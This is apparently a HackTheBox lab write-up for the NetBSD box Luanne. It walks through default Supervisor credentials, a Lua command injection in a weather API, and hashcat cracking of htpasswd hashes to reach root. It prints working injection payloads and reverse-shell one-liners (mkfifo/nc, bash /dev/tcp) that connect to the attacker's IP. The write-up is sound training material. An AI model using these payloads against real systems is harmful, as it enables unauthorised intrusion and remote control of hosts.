---
title: HTB: Luanne
url: https://0xdf.gitlab.io/2021/03/27/htb-luanne.html
date: 2021-03-27T13:45:00+00:00
difficulty: Easy [20]
tags: htb-luanne, ctf, hackthebox, nmap, netbsd, supervisor-process-manager, default-creds, http-basic-auth, burp, feroxbuster, api, lua, command-injection, htpasswd, hashcat, doas, pgp, netpgp, source-code, oscp-like-v2
---

![Luanne](https://0xdfimages.gitlab.io/img/luanne-cover.png)

Luanne was the first NetBSD box I’ve done on HTB. I’ll gain access to an instance of Supervisor Process Manager, and use that to leak a process list, which shows where to look on the port 80 webserver. I’ll find an API that I know is backed by a Lua script, and exploit a command injection vulnerability to get execution and a shell. I’ll get credentials for a webserver listening on localhost and find an SSH key hosted there to get to the second user. That user can doas (like sudo on BSD) arbitrary commands as root, the password is needed. It’s in an encrypted backup file which can be decrypted using PGP on the host. In Beyond Root, I’ll look at the Lua script, figure out how it works, where the injection vulnerability is, and compare that to the patched dev version to see how it was fixed.

## Box Info

| Name | [Luanne](https://hackthebox.com/machines/luanne)  [Luanne](https://hackthebox.com/machines/luanne) [Play on HackTheBox](https://hackthebox.com/machines/luanne) |
| --- | --- |
| Release Date | [28 Nov 2020](https://twitter.com/hackthebox_eu/status/1375037379313086469) |
| Retire Date | 27 Mar 2021 |
| OS | NetBSD |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Luanne |
| Radar Graph | Radar chart for Luanne |
| First Blood User | 01:34:11[jkr jkr](https://app.hackthebox.com/users/77141) |
| First Blood Root | 01:50:24[xct xct](https://app.hackthebox.com/users/13569) |
| Creator | [polarbearer polarbearer](https://app.hackthebox.com/users/159204) |

## Recon

### nmap

`nmap` found three open TCP ports, SSH (22), HTTP (80), and Medisa httpd / Supervisor process manager (9001):

```

oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.218
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-25 11:33 EDT
Warning: 10.10.10.218 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.218
Host is up (0.023s latency).
Not shown: 58365 filtered ports, 7167 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9001/tcp open  tor-orport

Nmap done: 1 IP address (1 host up) scanned in 71.24 seconds

oxdf@parrot$ nmap -p 22,80,9001 -sCV -oA scans/nmap-tcpscripts 10.10.10.218
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-25 11:35 EDT
Nmap scan report for 10.10.10.218
Host is up (0.026s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0)
| ssh-hostkey: 
|   3072 20:97:7f:6c:4a:6e:5d:20:cf:fd:a3:aa:a9:0d:37:db (RSA)
|   521 35:c3:29:e1:87:70:6d:73:74:b2:a9:a2:04:a9:66:69 (ECDSA)
|_  256 b3:bd:31:6d:cc:22:6b:18:ed:27:66:b4:a7:2a:e4:a5 (ED25519)
80/tcp   open  http    nginx 1.19.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=.
| http-robots.txt: 1 disallowed entry 
|_/weather
|_http-server-header: nginx/1.19.0
|_http-title: 401 Unauthorized
9001/tcp open  http    Medusa httpd 1.12 (Supervisor process manager)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=default
|_http-server-header: Medusa/1.12
|_http-title: Error response
Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 186.73 seconds

```

`nmap` identifies the box as running NetBSD, another BSD variant.

TCP 80 has a `robots.txt` file with `/weather` disallowed.

### Supervisor Process Manager - TCP 9001

#### Auth

Visiting the page returns a 401 and a prompt for auth:

![image-20210325120130827](https://0xdfimages.gitlab.io/img/image-20210325120130827.png)

There’s a hint there, “default”.

Googling for “supervisord default password” returns a top hit to the docs for the project on the [configuration file](http://supervisord.org/configuration.html). There isn’t a default password, but there is an example config file:

![image-20210325120522654](https://0xdfimages.gitlab.io/img/image-20210325120522654.png)

Sure enough, entering user / 123 lets me into the site:

![image-20210325120551942](https://0xdfimages.gitlab.io/img/image-20210325120551942.png)

#### Process List

The dashboard shows three running scripts, and clicking on the name of any of them leads to the output. I didn’t get anything interesting from `memory` or `uptime`. `process` returns:

```

/python3.8 /usr/pkg/bin/supervisord-3.8 
root        348  0.0  0.0  74136  2928 ?     Is    3:33PM 0:00.01 /usr/sbin/sshd 
_httpd      376  0.0  0.0  35244  2008 ?     Is    3:33PM 0:00.01 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L weather /usr/local/webapi/weather.lua -U _httpd -b /var/www 
root        402  0.0  0.0  20216  1664 ?     Is    3:33PM 0:00.01 /usr/sbin/cron 
_httpd     1997  0.0  0.0  14564   484 ?     O     4:10PM 0:00.00 /usr/bin/egrep ^USER| \\[system\\] *$| init *$| /usr/sbin/sshd *$| /usr/sbin/syslogd -s *$| /usr/pkg/bin/python3.8 /usr/pkg/bin/supervisord-3.8 *$| /usr/sbin/cron *$| /usr/sbin/powerd *$| /usr/libexec/httpd -u -X -s.*$|^root.* login *$| /usr/libexec/getty Pc ttyE.*$| nginx.*process.*$ 
root        421  0.0  0.0  19784  1580 ttyE1 Is+   3:33PM 0:00.00 /usr/libexec/getty Pc ttyE1 
root        388  0.0  0.0  19784  1584 ttyE2 Is+   3:33PM 0:00.00 /usr/libexec/getty Pc ttyE2 
root        426  0.0  0.0  19780  1580 ttyE3 Is+   3:33PM 0:00.00 /usr/libexec/getty Pc ttyE3 

```

There’s a long `grep` which is likely selecting which lines of the full process list are displayed here. The only command line string that really gives much information is the one for `httpd`:

```

/usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L weather /usr/local/webapi/weather.lua -U _httpd -b /var/www 

```

Using the [man page for httpd on NetBSD (or bozohttpd)](https://www.daemon-systems.org/man/httpd.8.html), the args are:
- `-u`: Enables the transformation of Uniform Resource Locators of the form /~user/ into the directory ~user/public\_html
- `-X`: Enables directory indexing
- `-s`: Force logging to stderr
- `-i 127.0.0.1`: listen on localhost
- `-I 3000`: listen on port 3000
- `-L weather weather.lua`: Adds a Lua script for the prefix `weather`. So Visiting `http://10.10.10.218/weather/[something]` will be handled by this Lua script.
- `-U _http`: Run as \_http user
- `-b`: Enable daemon mode
- `/var/www`: Root directory to serve from

It’s interesting that the Lua script is handling the path disallowed in the `robots.txt` file.

### Website - TCP 80

#### Site

Trying to visit the site pops an auth prompt:

![image-20210325113747662](https://0xdfimages.gitlab.io/img/image-20210325113747662.png)

#### HTTP 401

It’s not part of the box, but it is interesting to know what is really happening here. Looking in Burp, I’ll see this is really a GET request from my browser for `/`, with a 401 response from the server. Firefox sees that 401 and prompts for creds. If I add some and submit, it will send the same GET request again, this time with an extra header:

```

Authorization: Basic MHhkZjoweGRm

```

The base64 string is just the encoded creds I entered:

```

oxdf@parrot$ echo "MHhkZjoweGRm" | base64 -d
0xdf:0xdf

```

#### Response

More interestingly, there’s some information in the response:

```

HTTP/1.1 401 Unauthorized
Server: nginx/1.19.0
Date: Thu, 25 Mar 2021 15:40:47 GMT
Content-Type: text/html
Content-Length: 209
Connection: close
WWW-Authenticate: Basic realm="."

<html><head><title>401 Unauthorized</title></head>
<body><h1>401 Unauthorized</h1>
/index.html: <pre>No authorization</pre>
<hr><address><a href="//127.0.0.1:3000/">127.0.0.1:3000</a></address>
</body></html>

```

As `nmap` identified, the server is nginx.

The `WWW-Authenticate: Basic realm="."` header is saying that the type of auth required is HTTP basic, the description of the auth is just `.`, which doesn’t tell me much.

There’s also a reference to `127.0.0.1:3000` as the source of this response. That suggests that NGINX is proxying the requests on 80 to `httpd` to handle them on localhost port 3000, as noted above in the process list.

#### Directory Brute Force

I’ll run `feroxbuster` ([GitHub](https://github.com/epi052/feroxbuster)) against the site, but it doesn’t find anything:

```

oxdf@parrot$ feroxbuster -u http://10.10.10.218 -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt 
                                                                              
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__ 
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___                            
by Ben "epi" Risher 🤓                 ver: 2.2.1
───────────────────────────┬──────────────────────                        
 🎯  Target Url            │ http://10.10.10.218
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.2.1                 
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest 
───────────────────────────┴──────────────────────                       
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────                            
[####################] - 15s    29999/29999   0s      found:0       errors:0
[####################] - 14s    29999/29999   2005/s  http://10.10.10.218  

```

I’m trying the default wordlist for `feroxbuster` from [SecLists](https://github.com/danielmiessler/SecLists), but I also tried my old standby `directory-list-2.3-medium` and found nothing as well.

#### Using Information from Supervisord

There is a custom Lua script running on requests to `/weather/`. Just visiting that path returns a 404. But running `feroxbuster` again finds something:

```

oxdf@parrot$ feroxbuster -u http://10.10.10.218/weather -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt 
 
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.2.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.218/weather
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.2.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200        1l       12w        0c http://10.10.10.218/weather/forecast
[####################] - 15s    29999/29999   0s      found:1       errors:0      
[####################] - 15s    29999/29999   1976/s  http://10.10.10.218/weather

```

### Weather API

Visiting `http://10.10.10.218/weather/forecast` returns a raw JSON payload with a `message` that a city is required, and a hint on how to list them:

![image-20210325122325849](https://0xdfimages.gitlab.io/img/image-20210325122325849.png)

I can switch to `curl` and `jq` at this point:

```

oxdf@parrot$ curl -s http://10.10.10.218/weather/forecast | jq .
{
  "code": 200,
  "message": "No city specified. Use 'city=list' to list available cities."
}

```

I typically use `-s` on curl by habit so when I start piping it to things, I don’t see the status message.

Adding `?city=list` to the end of the url provides a list of cities in the UK:

```

oxdf@parrot$ curl -s http://10.10.10.218/weather/forecast?city=list | jq .
{
  "code": 200,
  "cities": [
    "London",
    "Manchester",
    "Birmingham",
    "Leeds",
    "Glasgow",
    "Southampton",
    "Liverpool",
    "Newcastle",
    "Nottingham",
    "Sheffield",
    "Bristol",
    "Belfast",
    "Leicester"
  ]
}

```

Picking a city from the list, it returns a bunch of (inaccurate) information about the weather there:

```

oxdf@parrot$ curl -s http://10.10.10.218/weather/forecast?city=Leicester
{"code": 200,"city": "Leicester","list": [{"date": "2021-03-25","weather": {"description": "snowy","temperature": {"min": "12","max": "46"},"pressure": "1799","humidity": "92","wind": {"speed": "2.1975513692014","degree": "102.76822959445"}}},{"date": "2021-03-26","weather": {"description": "partially cloudy","temperature": {"min": "15","max": "43"},"pressure": "1365","humidity": "51","wind": {"speed": "4.9522297247313","degree": "262.63571172766"}}},{"date": "2021-03-27","weather": {"description": "sunny","temperature": {"min": "19","max": "30"},"pressure": "1243","humidity": "13","wind": {"speed": "1.8041767538525","degree": "48.400944394059"}}},{"date": "2021-03-28","weather": {"description": "sunny","temperature": {"min": "30","max": "34"},"pressure": "1513","humidity": "84","wind": {"speed": "2.6126398323104","degree": "191.63755226741"}}},{"date": "2021-03-29","weather": {"description": "partially cloudy","temperature": {"min": "30","max": "36"},"pressure": "1772","humidity": "53","wind": {"speed": "2.7699138359167","degree": "104.89152945159"}}}]}

```

The city names are case-sensitive, and any input that isn’t an exact match leads to a 500 error:

```

oxdf@parrot$ curl -s http://10.10.10.218/weather/forecast?city=washington
{"code": 500,"error": "unknown city: washington"}

```

## Shell as \_http

### Identify Injection

The requests at `/weather/forecast` are being passed to a Lua script, and the results come back as JSON which, in the case of anything not in the cities list, includes the submitted input. Googling for “Lua Injection”, the first link returned was titled [Lua Web Application Secutiyy Vulnerabilities](https://www.syhunt.com/pt/index.php?n=Articles.LuaVulnerabilities). This article shows many different kinds of attacks, most of which are more complicated than I’ll need here. But what I found most useful were the examples of vulnerable scripts. The output sent back is typically written out with something like `r:puts(output)` or `ngx.say(output)` or `cgilua.put(output)`. If there’s no escaping done, perhaps I can inject commands.

Sending just a double quote returns the error message as if the city was `"`:

```

oxdf@parrot$ curl -s 'http://10.10.10.218/weather/forecast?city="'
{"code": 500,"error": "unknown city: ""}

```

However, sending just a single quote crashes the script:

```

oxdf@parrot$ curl -s "http://10.10.10.218/weather/forecast?city='"
<br>Lua error: /usr/local/webapi/weather.lua:49: attempt to call a nil value

```

If I add a closing parens and then a comment, it will actually send back the payload cut off in the middle:

```

oxdf@parrot$ curl -s "http://10.10.10.218/weather/forecast?city=')+--"
{"code": 500,"error": "unknown city:

```

This suggests that the string is being built in that command, and the comment took out the part that handles the closing `"` and `}`.

### Injection POC

To run a command from Lua, [GTFObins](https://gtfobins.github.io/gtfobins/lua/#sudo) shows it’s just `os.execute("[command]")`. Adding that works:

```

oxdf@parrot$ curl -s "http://10.10.10.218/weather/forecast?city=')+os.execute('id')+--"
{"code": 500,"error": "unknown city: uid=24(_httpd) gid=24(_httpd) groups=24(_httpd

```

To do a more complex payload, I’ll switch to letting `curl` encode my arg for me:

```

oxdf@parrot$ curl -G --data-urlencode "city=') os.execute('id') --" 'http://10.10.10.218/weather/forecast' -s 
{"code": 500,"error": "unknown city: uid=24(_httpd) gid=24(_httpd) groups=24(_httpd)

```

`-G` will force a GET commands, and use the data from `--data-urlencode` in the url instead of in the body.

### Shell

Because the box is BSD, some typical Linux reverse shells won’t work. I’ll start small. Can `nc` connect back to me?

```

oxdf@parrot$ curl -G --data-urlencode "city=') os.execute('nc 10.10.14.11 443') --" 'http://10.10.10.218/weather/forecast' -s

```

At my listener there’s a connection:

```

oxdf@parrot$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.11] from (UNKNOWN) [10.10.10.218] 654

```

This isn’t a shell, but I know that the box has netcat and can connect to me. I could try `-e /bin/bash`, but it doesn’t work. Running `nc -h 2>&1` shows the `-e` option isn’t there. My goto Bash shell actually does give a connection back, but then immediately dies:

```

oxdf@parrot$ curl -G --data-urlencode "city=') os.execute('bash -c "bash -i >& /dev/tcp/10.10.14.11/443 0&>1"') 'http://10.10.10.218/weather/forecast' -s

```

I tried a Lua shell, but the modules needed weren’t there:

```

oxdf@parrot$ curl -G --data-urlencode "city=') require('socket');require('os');t=socket.tcp();t:connect('10.10.14.11','443');os.execute('/bin/sh -i <&3 >&3 2>&3') --" 'http://10.10.10.218/weather/forecast' -s
{"code": 500,"error": "unknown city: <br>Lua error: [string "                httpd.write('{"code": 500,')..."]:2: module 'socket' not found:
        no field package.preload['socket']
        no file '/usr/share/lua/5.3/socket.lua'
        no file '/usr/share/lua/5.3/socket/init.lua'
        no file '/usr/lib/lua/5.3/socket.lua'
        no file '/usr/lib/lua/5.3/socket/init.lua'
        no file '/usr/lib/lua/5.3/socket.so'
        no file '/usr/lib/lua/5.3/loadall.so'

```

The FIFO shell did work:

```

oxdf@parrot$ curl -G --data-urlencode "city=') os.execute('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.11 443 >/tmp/f') --" 'http://10.10.10.218/weather/forecast' -s

```

And it connects to a listening `nc`:

```

oxdf@parrot$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.11] from (UNKNOWN) [10.10.10.218] 65453
sh: can't access tty; job control turned off
$ id
uid=24(_httpd) gid=24(_httpd) groups=24(_httpd)

```

## Shell as r.michaels

### Enumeration

#### Web

In the web root there are three files:

```

$ pwd  
/var/www
$ ls -la
total 20
drwxr-xr-x   2 root  wheel  512 Nov 25 11:27 .
drwxr-xr-x  24 root  wheel  512 Nov 24 09:55 ..
-rw-r--r--   1 root  wheel   47 Sep 16  2020 .htpasswd
-rw-r--r--   1 root  wheel  386 Sep 17  2020 index.html
-rw-r--r--   1 root  wheel   78 Nov 25 11:38 robots.txt

```

`index.html` has a page I wasn’t able to access without auth:

```

<!doctype html>
<html>
  <head>
    <title>Index</title>
  </head>
  <body>
    <p><h3>Weather Forecast API</h3></p>
    <p><h4>List available cities:</h4></p>
    <a href="/weather/forecast?city=list">/weather/forecast?city=list</a>
    <p><h4>Five day forecast (London)</h4></p>
    <a href="/weather/forecast?city=London">/weather/forecast?city=London</a>
    <hr>
  </body>
</html>

```

`robots.txt` is the same as noted in the `nmap`. `.htpasswd` is interesting. This is the file that defines the basic auth requirement:

```

webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0

```

Starting with `$1$` suggests this is a simple md5crypt hash (can verify in the [Hashcat list of example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)). Hashcat breaks it instantly with `hashcat -m 500 htpasswd --user /usr/share/wordlists/rockyou.txt` to `iamthebest`.

Using those creds, I can now load `http://10.10.10.218`:

![image-20210325131747107](https://0xdfimages.gitlab.io/img/image-20210325131747107.png)

This doesn’t really give anything new other than links back to the API I already exploited.

I did take a look at the Lua script, which is interesting, but not necessary for privesc (check out [Beyond Root](#beyond-root---lua-injection)).

#### Users

There’s only one user on the box, r.michaels:

```

$ ls -l /home
total 4
dr-xr-x---  7 r.michaels  users  512 Sep 16  2020 r.michaels

```

\_http can’t access this directory. But it seems like this user is a good next target.

There’s a single process in the process list that’s running as r.michaels:

```

$ ps auxww | grep michaels
r.michaels  185  0.0  0.0  35028  1980 ?     Is    3:33PM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3001 -L weather /home/r.michaels/devel/webapi/weather.lua -P /var/run/httpd_devel.pid -U r.michaels -b /home/r.michaels/devel/www 

```

It looks very similar to the `httpd` process above, but this one is running a different `weather.lua` script, listening on TCP 3001 (instead of 3000), and serving out of `/home/r.michaels/devel/www`.

### Exploit Dev Weather API [Fail]

Is this vulnerable to the same exploit? I can access it from this shell:

```

$ curl -s http://127.0.0.1:3001/weather/forecast?city=list
{"code": 200,"cities": ["London","Manchester","Birmingham","Leeds","Glasgow","Southampton","Liverpool","Newcastle","Nottingham","Sheffield","Bristol","Belfast","Leicester"]}

```

It looks like this version is not vulnerable to the command injection as before:

```

$ curl -s -G http://127.0.0.1:3001/weather/forecast --data-urlencode "city=') os.execute('id') --"
{"code": 500,"error": "unknown city: ') os.execute('id') --"}

```

I looked through the Lua script for places where there might have been a more difficult to guess vulnerability, but didn’t see anything (at least not with my limited Lua experience).

### HomeDir Read

I remember thinking it was a bit weird to see `-u` in the `httpd` command line. This makes the public folders in a users homedirectory web accessible. I didn’t have a username when I started poking at this service, but I do now.

Trying to access `/~r.michaels/` returns 401:

```

$ curl -s http://127.0.0.1:3001/~r.michaels/
<html><head><title>401 Unauthorized</title></head>
<body><h1>401 Unauthorized</h1>
~r.michaels//: <pre>No authorization</pre>
<hr><address><a href="//127.0.0.1:3001/">127.0.0.1:3001</a></address>
</body></html>

```

I can add in the creds from the `.htpasswd` file and they work:

```

$ curl -s http://127.0.0.1:3001/~r.michaels/ -u webapi_user:iamthebest
<!DOCTYPE html>
<html><head><meta charset="utf-8"/>
<style type="text/css">
table {
        border-top: 1px solid black;
        border-bottom: 1px solid black;
}
th { background: aquamarine; }
tr:nth-child(even) { background: lavender; }
</style>
<title>Index of ~r.michaels/</title></head>
<body><h1>Index of ~r.michaels/</h1>
<table cols=3>
<thead>
<tr><th>Name<th>Last modified<th align=right>Size
<tbody>
<tr><td><a href="../">Parent Directory</a><td>16-Sep-2020 18:20<td align=right>1kB
<tr><td><a href="id_rsa">id_rsa</a><td>16-Sep-2020 16:52<td align=right>3kB
</table>
</body></html>

```

Directory listing is enabled (`-X` in the command line), and this shows a single file, `id_rsa`. One more `curl` returns the private key:

```

$ curl -s http://127.0.0.1:3001/~r.michaels/id_rsa -u webapi_user:iamthebest
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAvXxJBbm4VKcT2HABKV2Kzh9GcatzEJRyvv4AAalt349ncfDkMfFB
...[snip]...

```

A note - This is not reading the private key from the users `~/.ssh` directory. For some reason, the user must have put their private key intentionally in their `~/public_html` directory. Perhaps they figured since it’s only on localhost it was less at risk there. Then again, it’s not clear what use it provides the user there either.

### Shell via SSH

With a copy of this key, I can get a shell as r.michaels:

```

oxdf@parrot$ ssh -i ~/keys/luanne-r.michaels r.michaels@10.10.10.218
Last login: Fri Sep 18 07:06:51 2020
NetBSD 9.0 (GENERIC) #0: Fri Feb 14 00:06:28 UTC 2020

Welcome to NetBSD!

luanne$

```

And grab `user.txt`:

```

luanne$ cat user.txt
ea5f0ce6************************

```

## Shell as root

### doas

`sudo -l` is the first thing I check on Linux hosts. The equivalent on BSD is `doas`. The configuration file is a bit buried:

```

luanne$ find / -name doas.conf 2>/dev/null
/usr/pkg/etc/doas.conf

```

But it says that this user can run anything as root:

```

luanne$ cat /usr/pkg/etc/doas.conf
permit r.michaels as root

```

Unfortunately, it requires a password:

```

luanne$ doas sh
Password:
doas: authentication failed

```

### Find Backup

In the current homedir, there are three folders:

```

luanne$ ls
backups     devel       public_html user.txt

```

`devel` has the code for the new version of the API. `public_html` just has the SSH key. `backups` is interesting, holding what looks like an encrypted Tar archive:

```

luanne$ ls -l backups/
total 4
-r--------  1 r.michaels  users  1970 Nov 24 09:25 devel_backup-2020-09-16.tar.gz.enc
luanne$ file backups/devel_backup-2020-09-16.tar.gz.enc
backups/devel_backup-2020-09-16.tar.gz.enc: data

```

### Decrypt

Looking around the box for any hint about what could be used to decrypt this data, I noticed a `.gnupg` directory in r.michael’s home directory, and it contains keyrings:

```

luanne$ ls -l /home/r.michaels/.gnupg/
total 8
-rw-------  1 r.michaels  users   603 Sep 14  2020 pubring.gpg
-rw-------  1 r.michaels  users  1291 Sep 14  2020 secring.gpg

```

`netpgp` is installed on the box, and it decrypts the file:

```

luanne$ netpgp --decrypt --output=/tmp/0xdf.tar.gz backups/devel_backup-2020-09-16.tar.gz.enc
signature  2048/RSA (Encrypt or Sign) 3684eb1e5ded454a 2020-09-14 
Key fingerprint: 027a 3243 0691 2e46 0c29 9f46 3684 eb1e 5ded 454a 
uid              RSA 2048-bit key <r.michaels@localhost>

luanne$ file /tmp/0xdf.tar.gz
/tmp/0xdf.tar.gz: gzip compressed data, last modified: Tue Nov 24 09:18:51 2020, from Unix, original size modulo 2^32 12288

```

### Backup Analysis

The file decompresses to contain familiar files at this point:

```

luanne$ tar zxvf 0xdf.tar.gz
x devel-2020-09-16/
x devel-2020-09-16/www/
x devel-2020-09-16/webapi/
x devel-2020-09-16/webapi/weather.lua
x devel-2020-09-16/www/index.html
x devel-2020-09-16/www/.htpasswd

```

`weather.lua` is exactly the same as the public version. `index.html` is also similar. The `.htpasswd` file is different:

```

luanne$ cat devel-2020-09-16/www/.htpasswd
webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.

```

It breaks the same way (`hashcat -m 500 htpasswd2 --user /usr/share/wordlists/rockyou.txt`), this time to the password `littlebear`.

### doas sh

Now with a potential password, I can try to `doas` as root, and it works:

```

luanne$ doas sh
Password:
# id
uid=0(root) gid=0(wheel) groups=0(wheel),2(kmem),3(sys),4(tty),5(operator),20(staff),31(guest),34(nvmm)

```

And I can grab the root flag:

```

# cat root.txt
7a9b5c20************************

```

## Beyond Root - Lua Injection

### Code Overview

I pretty much a noob at Lua, so of course I knew I wanted to understand how this script worked, and how I could inject into it, comparing the [vulnerable version](/files/htb-luanne-weather.lua) to the [patched](/files/htb-luanne-weather-dev.lua).

The general structure of the program looks like:

```

httpd = require 'httpd'
math = require 'math'
sqlite = require 'sqlite'

cities = {"London", "Manchester", "Birmingham", "Leeds", "Glasgow", "Southampton", "Liverpool", "Newcastle", "Nottingham", "Sheffield", "Bristol", "Belfast", "Leicester"}

weather_desc = {"sunny", "cloudy", "partially cloudy", "rainy", "snowy"}

function valid_city(cities, city)
...[snip]...
end

function forecast(env, headers, query)
    if query and query["city"]
...[snip]...
end

httpd.register_handler('forecast', forecast)

```

It loads some modules, defines some constants and two functions, and then calls `register_handler`. This is actually mentioned on the [httpd man page](https://www.daemon-systems.org/man/httpd.8.html):

> ```

>      -L prefix script
>                 Adds a new Lua script for a particular prefix.  The prefix
>                 should be an arbitrary text, and the script should be a full
>                 path to a Lua script.  Multiple -L options may be passed.  A
>                 separate Lua state is created for each prefix.  The Lua script
>                 can register callbacks using the
>                 httpd.register_handler('<name>', function) Lua function, which
>                 will trigger the execution of the Lua function function when a
>                 URL in the form http://<hostname>/<prefix>/<name> is being
>                 accessed.  The function is passed three tables as arguments,
>                 the server environment, the request headers, and the decoded
>                 query string plus any data that was sent as application/x-www-
>                 form-urlencoded.
>
> ```

So this is how `/weather/forecast` gets to the script, and then it is passed to the function `forecast`.

The `valid_city` function just checks if a string is in the list. The `forecast` function is where the injection is.

It starts by checking for the `city` parameter, and if it’s not there, it writes the message I first got on visiting the API:

```

function forecast(env, headers, query)
    if query and query["city"]
    then
...[snip]...
    else
        httpd.write("HTTP/1.1 200 Ok\r\n")
        httpd.write("Content-Type: application/json\r\n\r\n")
        httpd.print('{"code": 200, "message": "No city specified. Use \'city=list\' to list available cities."}')
    end
end

```

Back inside that snip above, it checks if `city=list`, and if so, generates the list of cities as a JSON string, writing it with `http.write`:

```

        local city = query["city"]
        if city == "list"
        then 
            httpd.write("HTTP/1.1 200 Ok\r\n")
            httpd.write("Content-Type: application/json\r\n\r\n")
            httpd.write('{"code": 200,')
            httpd.write('"cities": [')
            for k,v in pairs(cities) do
                httpd.write('"' .. v .. '"')
                if k < #cities
                then
                    httpd.write(',')
                end
            end                                  
            httpd.write(']}')                        

```

If `city` is not `list` and it’s not a valid city, then it jumps into the error message creation:

```

        elseif not valid_city(cities, city)                           
        then                                                            
            -- city=London') os.execute('id') --  
            httpd.write("HTTP/1.1 500 Error\r\n")    
            httpd.write("Content-Type: application/json\r\n\r\n")
            local json = string.format([[             
                httpd.write('{"code": 500,')                       
                httpd.write('"error": "unknown city: %s"}')           
            ]], city)                             

            load(json)()
        else
            -- just some fake weather data
            weather_data = {
...[snip generating random weather data]...
        end 

```

If it is a valid city, there’s a bunch of code generating random weather JSON.

### Vulnerability

The vulnerability is in how the error message JSON is created. First, a string, `json` is created using the `string.format` function:

```

local json = string.format([[             
    httpd.write('{"code": 500,')                       
    httpd.write('"error": "unknown city: %s"}')           
    ]], city)  

```

So if I pass in `city=0xdf`, then `json` will be:

```

httpd.write('{"code": 500,')
httpd.write('"error": "unknown city: 0xdf"}')

```

With this string built, it will pass that into `load`:

```

load(json)()

```

That is the dangerous part. `load` effectively loads the string into memory as Lua commands, and then the `()` runs that. It’s kind of like calling `eval` on a string in Python (also dangerous).

In the dev version of this script, the error message generation is much cleaner:

```

httpd.write("HTTP/1.1 500 Error\r\n")
httpd.write("Content-Type: application/json\r\n\r\n")
httpd.write('{"code": 500,')
httpd.write('"error": "unknown city: ' .. city .. '"}')        

```

This time it’s just appending the city into the string, and then passing that to `http.write`.